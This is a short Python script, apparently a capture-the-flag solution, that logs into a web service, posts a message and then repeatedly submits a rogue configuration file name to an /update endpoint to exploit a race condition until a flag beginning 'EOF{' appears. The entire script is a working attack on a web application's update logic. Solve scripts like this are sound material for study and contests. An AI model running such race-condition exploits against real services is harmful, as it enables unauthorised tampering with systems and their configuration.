from requests import get, post, Session

URL = "http://dsnspc.retro9.me:9000"
session = Session()

# Login and Create Session
session.post(URL+"/login", data={
    "username": "Retro9"
})

print("Login User as Retro9 ...")

# Check Profile
# print(session.get(URL+"/profile").text

# Send Message to The Server
session.post(URL+"/sendMessage", data={
    "title": "Title",
    "content": "Content",
    "group": "NaN"
})

ROUGE_YAML_FILE = "108536e1544d04754f60d3a4d946e35db7038fc731aef90510852f45a920c8fc.json"

# Update and Race Condition
while True:
    result = session.post(URL+"/update", data={
        "config": ROUGE_YAML_FILE
    })

    if "EOF{" in result.text:
        print(result.text)
        break
